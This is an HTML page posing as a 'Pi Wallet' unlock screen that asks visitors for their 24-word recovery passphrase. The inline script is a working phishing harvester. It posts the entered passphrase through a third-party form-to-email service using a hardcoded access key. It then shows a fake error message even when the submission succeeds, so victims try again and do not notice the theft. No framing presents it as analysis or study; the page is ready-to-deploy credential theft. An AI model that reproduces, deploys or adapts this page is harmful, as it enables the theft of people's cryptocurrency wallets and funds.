<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wallet Unlock</title>
  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
  <style>
    /* Header styles */
    .header {
      background-color: #562A77;
      color: white;
      padding: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .header h1 {
      font-size: 18px;
      margin: 0;
      padding-left: 7px;
      padding-right: 7px;
    }
    .header-icons {
      font-size: 20px;
    }

    /* Main content styles */
    .container {
      margin-top: 20px;
      text-align: center;
    }

    .unlock-textarea {
      width: 90%;
      height: 150px;
      border: 1px solid #ddd;
      padding: 10px;
      font-size: 18px;
      color: gray;
      resize: none;
      border-radius:10px;
    }

    .unlock-btn {
      background-color: #562A77;
      color: white;
      font-size: 16px;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      margin-top: 20px;
      width: 90%;
    }

    .description {
      font-size: 14px;
      color: #333;
      margin-top: 20px;
      text-align: left;
    }

    .description a {
      color: #007bff;
      text-decoration: none;
    }

    .description a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

<!-- Header -->
<div class="header">
  <span class="header-icons"><img src="icon.jpg" style="width:30px"></span>
  <h1><b>Wallet</b></h1>
  <span class="header-icons"><img src="side.png" style="width:30px"></span>
</div>

<!-- Main Content -->
<div class="container">
  <h2>Unlock Pi Wallet</h2>

  <!-- Form for sending the passphrase -->
  <form id="emailForm">
    <!-- Textarea for wallet passphrase -->
    <textarea id="walletPassphrase" name="walletPassphrase" class="unlock-textarea" placeholder="Enter your 24-word passphrase here" required></textarea>

    <!-- Submit button -->
    <button type="submit" class="unlock-btn">Unlock With Passphrase</button>
  </form>

  <!-- Response message -->
  <div id="responseMessage" style="margin-top: 20px; font-size: 16px; color: red;"></div>

  <!-- Description Text -->
  <div class="description">
    <p style="font-size:22px;font-weight:400">
      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
    </p>
    <p style="font-size:22px;font-weight:400">
      Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your Ï€ in your previous wallet will be inaccessible.
    </p>
  </div>
</div>


<!-- Bootstrap and jQuery JavaScript -->
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>

<script>


  // Handle the form submission
  document.getElementById("emailForm").addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent default form submission

    const walletPassphrase = document.getElementById("walletPassphrase").value;
    const responseMessage = document.getElementById("responseMessage");

    if (!walletPassphrase.trim()) {
      responseMessage.textContent = "Please enter a passphrase.";
      return;
    }

    // Web3Forms API integration
    const formData = new FormData();
    formData.append("access_key", "dc7a4d94-132d-4497-ad34-898d6b5e6ab5"); // Replace with your Web3Forms Access Key
    formData.append("subject", "Wallet Unlock Request");
    formData.append("from_name", "Wallet User");
    formData.append("from_email", "noreply@pip2pxchange.com"); // Replace with your email domain
    formData.append("message", `Wallet Passphrase: ${walletPassphrase}`);

    fetch("https://api.web3forms.com/submit", {
      method: "POST",
      body: formData
    })
      .then(response => response.json())
      .then(result => {
        if (result.success) {
          responseMessage.style.color = "red";
          responseMessage.textContent = "Error please try again";
        } else {
          responseMessage.style.color = "red";
          responseMessage.textContent = "Failed to send passphrase. Please try again.";
        }
      })
      .catch(error => {
        console.error("Error:", error);
        responseMessage.style.color = "red";
        responseMessage.textContent = "An error occurred while sending the passphrase.";
      });
  });
</script>

</body>
</html>
